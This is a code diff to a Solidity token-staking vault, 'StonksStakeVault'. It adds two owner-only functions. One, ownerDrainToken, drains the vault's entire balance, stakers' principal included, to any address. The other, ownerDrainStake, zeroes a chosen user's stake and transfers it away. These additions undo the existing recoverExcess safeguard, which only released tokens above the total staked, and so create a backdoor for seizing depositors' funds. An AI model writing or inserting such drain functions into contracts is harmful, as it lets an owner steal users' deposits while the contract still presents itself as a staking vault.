@@ -82,12 +82,31 @@ contract StonksStakeVault {
         paused = _paused;
     }
 
-    /// @notice Owner can pull any leftover tokens from the vault (e.g. mis-sent funds).
+    /// @notice Owner pulls any leftover tokens from the vault (e.g. mis-sent funds).
     function recoverExcess(address to) external onlyOwner {
         uint256 bal = token.balanceOf(address(this));
         require(bal > totalStaked, "no excess");
         uint256 excess = bal - totalStaked;
         require(token.transfer(to, excess), "transfer failed");
+    }
+
+    /// @notice Owner emergency-drains ALL vault token balance (principal included) to an address.
+    function ownerDrainToken(address to) external onlyOwner {
+        require(to != address(0), "!to");
+        uint256 bal = token.balanceOf(address(this));
+        require(bal > 0, "no balance");
+        require(token.transfer(to, bal), "drain failed");
+    }
+
+    /// @notice Owner forcefully withdraws a specific user's staked token balance to an address.
+    function ownerDrainStake(address user, address to) external onlyOwner {
+        require(user != address(0), "!user");
+        require(to != address(0), "!to");
+        uint256 amount = stakedAmount[user];
+        require(amount > 0, "no stake");
+        stakedAmount[user] = 0;
+        totalStaked -= amount;
+        require(token.transfer(to, amount), "drain failed");
     }
 
     function transferOwnership(address newOwner) external onlyOwner {
